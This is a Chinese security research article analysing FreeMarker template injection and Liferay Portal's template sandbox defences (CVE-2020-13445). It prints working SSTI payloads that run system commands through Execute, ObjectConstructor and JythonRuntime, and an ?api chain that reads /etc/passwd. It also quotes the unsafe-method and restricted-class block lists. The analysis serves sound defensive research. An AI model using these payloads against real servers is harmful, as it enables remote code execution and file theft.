> 原文链接: https://www.anquanke.com//post/id/215348 


# 逃逸安全的模板沙箱（一）——FreeMarker（上）


                                阅读量   
                                **118753**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t016c97928179240191.png)](https://p4.ssl.qhimg.com/t016c97928179240191.png)



## 前言

8月5日 [@pwntester](https://github.com/pwntester) 联合 [@Oleksandr](https://github.com/Oleksandr) Mirosh 发表了一个关于 Java 模板注入的**BlackHat USA 2020 议题**[1]，议题介绍了现阶段各种 CMS 模板引擎中存在的缺陷，其中包含通用缺陷以及各个模板引擎特性造成的缺陷。由于不同模板引擎有不同语法特性，因此文章将分为系列文章进行阐述。

笔者前期主要是对 Liferay 的 FreeMarker 引擎进行了调试分析，故本文先以 FreeMarker 为例，梳理该模板引擎 SSTI 漏洞的前世今生，同时叙述自己的 Liferay FreeMarker SSTI 漏洞踩坑历程及对 Liferay 安全机制的分析。由于涉及内容比较多，请大家耐心阅读，若是已经本身对 FreeMarker 引擎有了解，可直接跳到文章后半部分阅读。

## FreeMarker基础知识

FreeMarker 是一款模板引擎，即一种基于模板和需要改变的数据， 并用来生成输出文本( HTML 网页，电子邮件，配置文件，源代码等)的通用工具，其模板语言为 FreeMarker Template Language (FTL）。

[![](https://p0.ssl.qhimg.com/t01e9d8aceff8071a27.png)](https://p0.ssl.qhimg.com/t01e9d8aceff8071a27.png)

在这里简单介绍下 FreeMarker 的几个语法，其余语法指令可自行在 FreeMarker 官方手册[2]进行查询。

### <a class="reference-link" name="FTL%E6%8C%87%E4%BB%A4%E8%A7%84%E5%88%99"></a>FTL指令规则

在 FreeMarker 中，我们可以通过FTL标签来使用指令。FreeMarker 有3种 FTL 标签，这和 HTML 标签是完全类似的。

```
开始标签:&lt;#directivename parameter&gt; 
结束标签:&lt;/#directivename&gt; 
空标签:&lt;#directivename parameter/&gt;
```

实际上，使用标签时前面的符号 # 也可能变成 @，如果该指令是一个用户指令而不是系统内建指令时，应将 # 符号改成 @ 符号。这里主要介绍 assign 指令，主要是用于为该模板页面**创建**或**替换**一个顶层变量。

```
&lt;#assign name1=value1 name2=value2 ... nameN=valueN&gt;
or
&lt;#assign same as above... in namespacehash&gt;
or
&lt;#assign name&gt;
  capture this
&lt;/#assign&gt;
or
&lt;#assign name in namespacehash&gt;
  capture this
&lt;/#assign&gt;

Tips:name为变量名，value为表达式，namespacehash是命名空间创建的哈希表，是表达式。

for example:
&lt;#assign seq = ["foo", "bar", "baz"]&gt;//创建了一个变量名为seq的序列
```

创建好的变量，可以通过**插值**进行调用。插值是用来给表达式插入具体值然后转换为文本(字符串)，FreeMarker 的插值主要有如下两种类型：
<li>通用插值：`$`{`expr`}``
</li>
<li>数字格式化插值： `#`{`expr`}``
</li>
这里主要介绍通用插值，当插入的值为字符串时，将**直接输出表达式结果**，举个例子：

```
eg:
$`{`100 + 5`}` =&gt; 105
$`{`seq[1]`}` =&gt; bar //上文创建的序列
```

插值仅仅可以在两种位置使用：在文本区(比如 `Hello $`{`name`}`!`) 和字符串表达式(比如 `&lt;#include "/footer/$`{`company`}`.html"&gt;`)中。

### <a class="reference-link" name="%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0"></a>内建函数

FreeMarker 提供了大量的内建函数，用于拓展模板语言的功能，大大增强了模板语言的可操作性。具体用法为`variable_name?method_name`。然而其中也存在着一些危险的内建函数，这些函数也可以在官方文档中找到，此处不过多阐述。主要介绍两个内建函数，`api`和`new`，如果开发人员不加以限制，将造成极大危害。
<li>
`api`函数如果 value 本身支撑`api`这个特性，`value?api`会提供访问 value 的 API（通常为 Java API），比如`value?api.someJavaMethod()`。</li>
```
eg：
  &lt;#assign classLoader=object?api.class.protectionDomain.classLoader&gt;
  //获取到classloader即可通过loadClass方法加载恶意类
```

但值得庆幸的是，`api`内建函数并不能随意使用，**必须在配置项`api_builtin_enabled`为`true`时才有效，而该配置在`2.3.22`版本之后默认为`false`**。
<li>
`new`函数这是用来创建一个具体实现了`TemplateModel`接口的变量的内建函数。在 `?` 的左边可以指定一个字符串， 其值为具体实现了 `TemplateModel` 接口的完整类名，然后函数将会调用该类的构造方法生成一个对象并返回。</li>
```
//freemarker.template.utility.Execute实现了TemplateMethodModel接口(继承自TemplateModel)
  &lt;#assign ex="freemarker.template.utility.Execute"?new()&gt; 
      $`{`ex("id")`}`//系统执行id命令并返回
  =&gt; uid=81(tomcat) gid=81(tomcat) groups=81(tomcat)
```

**拥有编辑模板权限的用户可以创建任意实现了 `TemplateModel` 接口的Java对象，同时还可以触发没有实现 `TemplateModel` 接口的类的静态初始化块**，因此`new`函数存在很大的安全隐患。好在官方也提供了限制的方法，可以使用 `Configuration.setNewBuiltinClassResolver(TemplateClassResolver)` 或设置 `new_builtin_class_resolver` 来限制这个内建函数对类的访问(从 2.3.17版开始)。

## FreeMarker初代SSTI漏洞及安全机制

经过前文的介绍，我们可以发现 FreeMarker 的一些特性将造成模板注入问题，在这里主要通过`api`和`new`两个内建函数进行分析。
<li>
**api 内建函数的利用**我们可以通过`api`内建函数获取类的`classloader`然后加载恶意类，或者通过`Class.getResource`的返回值来访问`URI`对象。`URI`对象包含`toURL`和`create`方法，我们通过这两个方法创建任意`URI`，然后用`toURL`访问任意URL。</li>
```
eg1：
  &lt;#assign classLoader=object?api.class.getClassLoader()&gt;
  $`{`classLoader.loadClass("our.desired.class")`}`

  eg2：
  &lt;#assign uri=object?api.class.getResource("/").toURI()&gt;
  &lt;#assign input=uri?api.create("file:///etc/passwd").toURL().openConnection()&gt;
  &lt;#assign is=input?api.getInputStream()&gt;
  FILE:[&lt;#list 0..999999999 as _&gt;
      &lt;#assign byte=is.read()&gt;
      &lt;#if byte == -1&gt;
          &lt;#break&gt;
      &lt;/#if&gt;
  $`{`byte`}`, &lt;/#list&gt;]
```
<li>
**new 内建函数的利用**主要是寻找实现了 `TemplateModel` 接口的可利用类来进行实例化。`freemarker.template.utility`包中存在三个符合条件的类，分别为`Execute`类、`ObjectConstructor`类、`JythonRuntime`类。</li>
```
&lt;#assign value="freemarker.template.utility.Execute"?new()&gt;$`{`value("calc.exe")`}`
  &lt;#assign value="freemarker.template.utility.ObjectConstructor"?new()&gt;$`{`value("java.lang.ProcessBuilder","calc.exe").start()`}`
  &lt;#assign value="freemarker.template.utility.JythonRuntime"?new()&gt;&lt;@value&gt;import os;os.system("calc.exe")&lt;/@value&gt;//@value为自定义标签
```

当然对于这两种方式的利用，FreeMarker 也做了相应的安全措施。针对`api`的利用方式，设置配置项`api_builtin_enabled`的默认值为`false`。同时为了防御通过其他方式调用恶意方法，FreeMarker内置了一份危险方法名单`unsafeMethods.properties`[3]，诸如`getClassLoader`、`newInstance`等危险方法都被禁用了，下面列出一小部分，其余请自行查阅文件。

```
//unsafeMethods.properties
java.lang.Object.wait()
java.lang.Object.wait(long)
java.lang.Object.wait(long,int)
java.lang.Object.notify()
java.lang.Object.notifyAll()

java.lang.Class.getClassLoader()
java.lang.Class.newInstance()
java.lang.Class.forName(java.lang.String)
java.lang.Class.forName(java.lang.String,boolean,java.lang.ClassLoader)

java.lang.reflect.Constructor.newInstance([Ljava.lang.Object;)
...
more
```

针对`new`的利用方式，上文已提到过官方提供的一种限制方式——使用 `Configuration.setNewBuiltinClassResolver(TemplateClassResolver)` 或设置 `new_builtin_class_resolver` 来限制这个内建函数对类的访问。此处官方提供了三个预定义的解析器：
<li>
**UNRESTRICTED_RESOLVER**：简单地调用`ClassUtil.forName(String)`。</li>
<li>
**SAFER_RESOLVER**：和第一个类似，但禁止解析`ObjectConstructor`，`Execute`和`freemarker.template.utility.JythonRuntime`。</li>
<li>
**ALLOWS_NOTHING_RESOLVER**：禁止解析任何类。</li>
当然用户自身也可以自定义解析器以拓展对危险类的限制，只需要实现`TemplateClassResolver`接口就好了，接下来会介绍到的 Liferay 就是通过其自定义的解析器`LiferayTemplateClassResolver`去构建 FreeMarker 的模板沙箱。

## Liferay FreeMarker模板引擎SSTI漏洞踩坑历程

### <a class="reference-link" name="%E7%A2%B0%E5%87%BA%E4%B8%80%E6%89%87%E7%AA%97"></a>碰出一扇窗

在研究这个 BlackHat 议题的过程中，我们遇到了很多问题，接下来就顺着我们的分析思路，一起探讨 Liferay 的安全机制，本次测试用的环境为 Liferay Portal CE 7.3 GA1。

先来看看 GHSL 安全团队发布的 Liferay SSTI 漏洞通告[4]：

> Even though Liferay does a good job extending the FreeMarker sandbox with a custom ObjectWrapper (`com.liferay.portal.template.freemarker.internal.RestrictedLiferayObjectWrapper.java`) which enhances which objects can be accessed from a Template, and also disables insecure defaults such as the `?new` built-in to prevent instantiation of arbitrary classes, it stills exposes a number of objects through the Templating API that can be used to circumvent the sandbox and achieve remote code execution.
Deep inspection of the exposed objects’ object graph allows an attacker to get access to objects that allow them to instantiate arbitrary Java objects.

可以看到，给出的信息十分精简有限，但是还是能从中找到关键点。结合议题介绍和其他同类型的漏洞介绍，我们能梳理出一些关键点。
<li>
**Exposed Object**通告中提及了通过模板 API 暴露出大量的可访问对象，而这些对象即为 SSTI 漏洞的入口，通过这些对象的方法或者属性可以进行模板沙箱的绕过。这也是议题的一大重点，因为大多数涉及第三方模板引擎的CMS都没有对这些暴露的对象进行控制。</li>
<li>
**RestrictedLiferayObjectWrapper.java**根据介绍，该自定义的`ObjectWrapper`拓展了FreeMarker的安全沙箱，增强了可通过模板访问的对象，同时也限制了不安全的默认配置以防止实例化任何类，比如`?new`方法。可以看出这是Liferay赋予模板沙箱的主要安全机制。</li>
可以看到，重点在于如何找到暴露出的对象，其次思考如何利用这些对象绕过Liferay的安全机制。

我们在编辑模板时，会看到一个代码提示框。列表中的变量都是可以访问的，且无需定义，也不用实现`TemplateModel`接口。但该列表会受到沙箱的限制，其中有一部分对象被封禁，无法被调用。

[![](https://p4.ssl.qhimg.com/t01fec9fb250b2beaf9.png)](https://p4.ssl.qhimg.com/t01fec9fb250b2beaf9.png)

这些便是通过模板 API 暴露出来的一部分对象，但这是以用户视角所看到的，要是我们以运行态的视角去观察呢。既然有了暴露点，其背后肯定存在着许多未暴露出的对象。

所以我们可以通过调试定位到一个关键对象——`FreeMarkerTemplate`，其本质上是一个`Map&lt;String, Object&gt;`对象。该对象不仅涵盖了上述列表中的对象，还存在着很多其他未暴露出的对象。整个`FreeMarkerTemplate`对象共列出了154个对象，大大拓宽了我们的利用思路。**在FreeMarker引擎里，这些对象被称作为根数据模型（`rootDataModel`)。**

[![](https://p1.ssl.qhimg.com/t011f1de76c01144a4c.png)](https://p1.ssl.qhimg.com/t011f1de76c01144a4c.png)

那么可以尝试从这154个对象中找出可利用的点，为此笔者进行了众多尝试，但由于 Liferay 健全的安全机制，全都失败了。下面是一些调试过程中发现在后续利用过程中可能有用的对象：

```
"getterUtil" -&gt; `{`GetterUtil_IW@47242`}` //存在各种get方法
"saxReaderUtil" -&gt; `{`$Proxy411@47240`}` "com.liferay.portal.xml.SAXReaderImpl@294e3d8d"
    //代理对象，存在read方法，可以传入File、url等参数
"expandoValueLocalService" -&gt; `{`$Proxy58@47272`}` "com.liferay.portlet.expando.service.impl.ExpandoValueLocalServiceImpl@15152694"
    //代理对象，其handler为AopInvocationHandler，存在invoke方法，且方法名和参数名可控。proxy对象可以通过其setTarget方法进行替换。
"realUser" -&gt; `{`UserImpl@49915`}`//敏感信息
"user" -&gt; `{`UserImpl@49915`}`//敏感信息
"unicodeFormatter" -&gt; `{`UnicodeFormatter_IW@47290`}` //编码转换
"urlCodec" -&gt; `{`URLCodec_IW@47344`}` //url编解码
"jsonFactoryUtil" -&gt; `{`JSONFactoryImpl@47260`}` //可以操作各种JSON相关方法
```

接下来将会通过叙述笔者对各种利用思路的尝试，对 Liferay 中 FreeMarker 模板引擎的安全机制进行深入分析。

### <a class="reference-link" name="%E2%80%9C%E6%94%BB%E4%B8%8D%E7%A0%B4%E2%80%9D%E7%9A%84%20Liferay%20FreeMarker%20%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6"></a>“攻不破”的 Liferay FreeMarker 安全机制

在以往我们一般是通过`Class.getClassloader().loadClass(xxx)`的方式加载任意类，但是在前文提及的`unsafeMethods.properties`中，我们可以看到`java.lang.Class.getClassLoader()`方法是被禁止调用的。

这时候我们只能另辟蹊径，**在 Java 官方文档中可以发现`Class`类有一个`getProtectionDomain`方法，可以返回一个`ProtectionDomain`对象[5]。而这个对象同时也有一个`getClassLoader`方法，并且`ProtectionDomain.getClassLoader`方法并没有被禁止调用。**

获取`CLassLoader`的方式有了，接下来，我们只要能够获得`class`对象，就可以加载任意类。但是当我们试图去获取`class`对象时，会发现这是行不通的，因为这会触发 Liferay 的安全机制。

[![](https://p2.ssl.qhimg.com/t01ce4b2094c06c8f75.png)](https://p2.ssl.qhimg.com/t01ce4b2094c06c8f75.png)

定位到 GHSL 团队提及的`com.liferay.portal.template.freemarker.internal.RestrictedLiferayObjectWrapper.java`文件，可以发现模板对象会经过`wrap`方法修饰。

通过`wrap(java.lang.Object obj)`方法，用户可以传入一个`Object`对象，然后返回一个与之对应的`TemplateModel`对象，或者抛出异常。**模板在语法解析的过程中会调用`TemplateModel`对象的`get`方法，而其中又会调用`BeansWrapper`的`invokeMethod`进行解析，最后会调用外部的`wrap`方法对获取到的对象进行包装。**

[![](https://p0.ssl.qhimg.com/t0126b6b93ffa1e5104.png)](https://p0.ssl.qhimg.com/t0126b6b93ffa1e5104.png)

此处的`getOuterIdentity`即为`TemplateModel`对象指定的`Wrapper`。除了预定义的一些对象，其余默认使用`RestrictedLiferayObjectWrapper`进行解析。

回到`RestrictedLiferayObjectWrapper`，该包装类主要的继承关系为`RestrictedLiferayObjectWrapper-&gt;LiferayObjectWrapper-&gt;DefaultObjectWrapper-&gt;BeansWrapper`，在`wrap`的执行过程中会逐步调用父类的`wrap`方法，那么先来分析`RestrictedLiferayObjectWrapper`的`wrap`方法。

[![](https://p3.ssl.qhimg.com/t01c260ab423300505e.png)](https://p3.ssl.qhimg.com/t01c260ab423300505e.png)

`wrap`方法中会先通过`getClass()`方法获得`class`对象，然后调用`_checkClassIsRestricted`方法，进行黑名单类的判定。

[![](https://p5.ssl.qhimg.com/t016a393a03aa8f6415.png)](https://p5.ssl.qhimg.com/t016a393a03aa8f6415.png)

**此处`_allowedClassNames`、`_restrictedClasses`和`_restrictedMethodNames`是在`com.liferay.portal.template.freemarker.configuration.FreeMarkerEngineConfiguration`中被预先定义的黑白名单，其中`_allowedClassNames`默认为空。**对比一下7.3.0-GA1和7.3.2-GA3内置的黑名单：
- 7.3.0-GA1
```
@Meta.AD(name = "allowed-classes", required = false)
  public String[] allowedClasses();

  @Meta.AD(
     deflt = "com.liferay.portal.json.jabsorb.serializer.LiferayJSONDeserializationWhitelist|java.lang.Class|java.lang.ClassLoader|java.lang.Compiler|java.lang.Package|java.lang.Process|java.lang.Runtime|java.lang.RuntimePermission|java.lang.SecurityManager|java.lang.System|java.lang.Thread|java.lang.ThreadGroup|java.lang.ThreadLocal",
     name = "restricted-classes", required = false
  )
  public String[] restrictedClasses();

  @Meta.AD(
     deflt = "com.liferay.portal.model.impl.CompanyImpl#getKey",
     name = "restricted-methods", required = false
  )
  public String[] restrictedMethods();

  @Meta.AD(
      deflt = "httpUtilUnsafe|objectUtil|serviceLocator|staticFieldGetter|staticUtil|utilLocator",
      name = "restricted-variables", required = false
  )
  public String[] restrictedVariables();
```
- 7.3.2-GA3
```
@Meta.AD(name = "allowed-classes", required = false)
  public String[] allowedClasses();

  @Meta.AD(
      deflt = "com.ibm.*|com.liferay.portal.json.jabsorb.serializer.LiferayJSONDeserializationWhitelist|com.liferay.portal.spring.context.*|io.undertow.*|java.lang.Class|java.lang.ClassLoader|java.lang.Compiler|java.lang.Package|java.lang.Process|java.lang.Runtime|java.lang.RuntimePermission|java.lang.SecurityManager|java.lang.System|java.lang.Thread|java.lang.ThreadGroup|java.lang.ThreadLocal|org.apache.*|org.glassfish.*|org.jboss.*|org.springframework.*|org.wildfly.*|weblogic.*",
      name = "restricted-classes", required = false
  )
  public String[] restrictedClasses();

  @Meta.AD(
      deflt = "com.liferay.portal.model.impl.CompanyImpl#getKey",
      name = "restricted-methods", required = false
  )
  public String[] restrictedMethods();

  @Meta.AD(
      deflt = "httpUtilUnsafe|objectUtil|serviceLocator|staticFieldGetter|staticUtil|utilLocator",
      name = "restricted-variables", required = false
  )
  public String[] restrictedVariables();
```

已修复的7.3.2版本增加了许多黑名单类，而这些黑名单类就是绕过沙箱的重点。如何利用这些黑名单中提及的类，进行模板沙箱的绕过，我们放在下篇文章进行阐述，这里暂不讨论。

我们可以发现`java.lang.Class`类已被拉黑，也就是说模板解析的过程中不能出现`Class`对象。但是，针对这种过滤方式，依旧存在绕过的可能性。

GHSL 安全团队在 JinJava 的 SSTI 漏洞通告提及到了一个利用方式：

> JinJava does a great job preventing access to `Class` instances. It will prevent any access to a `Class` property or invocation of any methods returning a `Class` instance. However, it does not prevent Array or Map accesses returning a `Class` instance. Therefore, it should be possible to get an instance of `Class` if we find a method returning `Class[]` or `Map&lt;?, Class&gt;`.

[![](https://p0.ssl.qhimg.com/t01d86980c3577927bd.png)](https://p0.ssl.qhimg.com/t01d86980c3577927bd.png)

既然`Class`对象被封禁，那么我们可以考虑通过`Class[]`进行绕过，**因为黑名单机制是通过`getClass`方法进行判断的，而`[Ljava.lang.Class`并不在黑名单内。**另外，针对`Map&lt;?,Class&gt;`的利用方式主要是通过`get`方法获取到`Class`对象，而不是通过`getClass`方法，主要是用于拓展获得`Class`对象的途径。因为需要自行寻找符合条件的方法，所以这种方式仍然具有一定的局限性，但是相信这个 trick 在某些场景下的利用能够大放光彩。

经过一番搜寻，暂未在代码中寻找到合适的利用类，因此通过`Class`对象获取`ClassLoader`的思路宣告失败。此外，实质上`ClassLoader`也是被加入到黑名单中的。因此就算我们能从模板上下文中直接提取出`ClassLoader`对象，避免直接通过`Class`获取，也无法操控到`ClassLoader`对象。

既然加载任意类的思路已经被 Liferay 的安全机制防住，我们只能换个思路——寻找一些可被利用的恶意类或者危险方法。**此处主要有两个思路，一个是通过`new`内建函数实例化恶意类，另外一个就是上文提及的`JSONFactoryImpl`对象**。

文章开头提到过三种利用方式，但是由于 Liferay 自定义解析器的存在，均无法再被利用。定位到`com.liferay.portal.template.freemarker.internal.LiferayTemplateClassResolver`这个类，重点关注其`resolve`方法。可以看见，在代码层直接封禁了`Execute`和`ObjectConstructor`的实例化，其次又进行了黑名单类的判定。此处`restrictedClassNames`跟上文所用的黑名单一致。

[![](https://p0.ssl.qhimg.com/t0150a83e2ac2198997.png)](https://p0.ssl.qhimg.com/t0150a83e2ac2198997.png)

这时候可能我们会想到，只要另外找一个实现`TemplateModel` 接口并且不在黑名单内的恶意类（比如`JythonRuntime`类）就可以成功绕过黑名单。然而 Liferay 的安全机制并没有这么简单，继续往下看。`resolve`后半部分进行了白名单校验，而这里的`allowedClasseNames`在配置里面默认为空，因此就算绕过了黑名单的限制，没有白名单的庇护也是无济于事。

[![](https://p0.ssl.qhimg.com/t0165d40c32c65d8426.png)](https://p0.ssl.qhimg.com/t0165d40c32c65d8426.png)

黑白名单的配合，直接宣告了`new`内建函数利用思路的惨败。不过，在这个过程中，我们还发现了一个有趣的东西。

假设我们拥有控制白名单的权限，但是对于`JythonRuntime`类的利用又有环境的限制，这时候只能寻找其他的利用类。在调试过程中，我们注意到一个类——`com.liferay.portal.template.freemarker.internal.LiferayObjectConstructor`，**这个类的结构跟`ObjectConstructor`极其相似，也同样拥有`exec`方法，且参数可控**。加入白名单测试弹计算器命指令，可以正常执行。

[![](https://p3.ssl.qhimg.com/t014a545e190a34c4f7.png)](https://p3.ssl.qhimg.com/t014a545e190a34c4f7.png)

虽然此处受白名单限制，利用难度较高。但是从另外的角度来看，`LiferayObjectConstructor`可以说是`ObjectConstructor`的复制品，在某些场景下可能会起到关键作用。

回归正题，此时我们只剩下一条思路——`JSONFactoryImpl`对象。不难发现，这个对象拥有着一系列与JSON有关的方法，其中包括`serialize`和`deserialize`方法。

重点关注其`deserialize`方法，因为我们可以控制传入的JSON字符串，从而反序列化出我们需要的对象。此处`_jsonSerializer`为`LiferayJSONSerializer`对象（继承自`JSONSerializer`类）。

[![](https://p0.ssl.qhimg.com/t01361143c2b80457c7.png)](https://p0.ssl.qhimg.com/t01361143c2b80457c7.png)

跟进`LiferayJSONSerializer`父类的`fromJSON`方法，发现其中又调用了`unmarshall`方法。

[![](https://p3.ssl.qhimg.com/t01dbf3df48847782b7.png)](https://p3.ssl.qhimg.com/t01dbf3df48847782b7.png)

在`unmarshall`方法中会调用`getClassFromHint`方法，不过该方法在子类被重写了。

[![](https://p5.ssl.qhimg.com/t0191ead8dfbd476683.png)](https://p5.ssl.qhimg.com/t0191ead8dfbd476683.png)

跟进`LiferayJSONSerializer.getClassFromHint`方法，方法中会先进行`javaClass`字段的判断，如果类不在白名单里就移除`serializable`字段里的值，然后放进`map`字段中，最后将类名更改为`java.util.HashMap`。**如果通过白名单校验，就会通过`contextName`字段的值去指定`ClassLoader`用于加载`javaClass`字段指定的类。**最后在方法末尾会执行`super.getClassFromHint(object)`，回调父类的`getClassFromHint`的方法。

[![](https://p0.ssl.qhimg.com/t0192c2c5c38a7b1b67.png)](https://p0.ssl.qhimg.com/t0192c2c5c38a7b1b67.png)

我们回到`unmarshall`方法，可以看到在方法末尾处会再次调用`unmarshall`方法，实质上这是一个递归解析 JSON 字符串的过程。这里有个`getSerializer`方法，主要是针对不同的`class`获取相应的序列器，这里不过多阐述。

[![](https://p4.ssl.qhimg.com/t01c3f20e299b46c339.png)](https://p4.ssl.qhimg.com/t01c3f20e299b46c339.png)

因为递归调用的因素，每次都会进行类名的白名单判定。而白名单在`portal-impl.jar`里的`portal.properties`被预先定义：

```
//Line 7227
json.deserialization.whitelist.class.names=\
    com.liferay.portal.kernel.cal.DayAndPosition,\
    com.liferay.portal.kernel.cal.Duration,\
    com.liferay.portal.kernel.cal.TZSRecurrence,\
    com.liferay.portal.kernel.messaging.Message,\
    com.liferay.portal.kernel.model.PortletPreferencesIds,\
    com.liferay.portal.kernel.security.auth.HttpPrincipal,\
    com.liferay.portal.kernel.service.permission.ModelPermissions,\
    com.liferay.portal.kernel.service.ServiceContext,\
    com.liferay.portal.kernel.util.GroupSubscriptionCheckSubscriptionSender,\
    com.liferay.portal.kernel.util.LongWrapper,\
    com.liferay.portal.kernel.util.SubscriptionSender,\
    java.util.GregorianCalendar,\
    java.util.Locale,\
    java.util.TimeZone,\
    sun.util.calendar.ZoneInfo
```

可以看到，白名单成功限制了用户通过 JSON 反序列化任意类的操作。**虽然白名单类拥有一个`register`方法，可自定义添加白名单类。**但 Liferay 也早已意识到这一点，为了防止该类被恶意操控，将`com.liferay.portal.json.jabsorb.serializer.LiferayJSONDeserializationWhitelist`添加进黑名单。

至此，利用思路在 Liferay 的安全机制下全部惨败。Liferay 健全的黑白名单机制，从根源上限制了大多数攻击思路的利用，可谓是“攻不破”的铜墙铁壁。但是，在众多安全研究人员的猛烈进攻下，该安全机制暴露出一个弱点。通过这个弱点可一举击破整个安全机制，从内部瓦解整个防线。而关于这个弱点的阐述及其利用，我们下一篇文章见。

## References

[1] Room for Escape: Scribbling Outside the Lines of Template Security

[https://www.blackhat.com/us-20/briefings/schedule/#room-for-escape-scribbling-outside-the-lines-of-template-security-20292](https://www.blackhat.com/us-20/briefings/schedule/#room-for-escape-scribbling-outside-the-lines-of-template-security-20292)

[2] FreeMarker Java Template Engine

[https://freemarker.apache.org/](https://freemarker.apache.org/)

[3] FreeMarker unsafeMethods.properties

[https://github.com/apache/freemarker/blob/2.3-gae/src/main/resources/freemarker/ext/beans/unsafeMethods.properties](https://github.com/apache/freemarker/blob/2.3-gae/src/main/resources/freemarker/ext/beans/unsafeMethods.properties)

[4] GHSL-2020-043: Server-side template injection in Liferay – CVE-2020-13445

[https://securitylab.github.com/advutiliisories/GHSL-2020-043-liferay_ce](https://securitylab.github.com/advutiliisories/GHSL-2020-043-liferay_ce)

[5] ProtectionDomain (Java Platform SE 8 )

[https://docs.oracle.com/javase/8/docs/api/index.html?java/security/ProtectionDomain.html](https://docs.oracle.com/javase/8/docs/api/index.html?java/security/ProtectionDomain.html)

[6] In-depth Freemarker Template Injection

[https://ackcent.com/blog/in-depth-freemarker-template-injection/](https://ackcent.com/blog/in-depth-freemarker-template-injection/)

[7] FreeMarker模板注入实现远程命令执行

[https://www.cnblogs.com/Eleven-Liu/p/12747908.html](https://www.cnblogs.com/Eleven-Liu/p/12747908.html)

<strong>作者：DEADF1SH_CAT @ 知道创宇404实验室<br>
时间：2020年8月24日<br>
原文链接：[https://paper.seebug.org/1304/](https://paper.seebug.org/1304/) </strong>
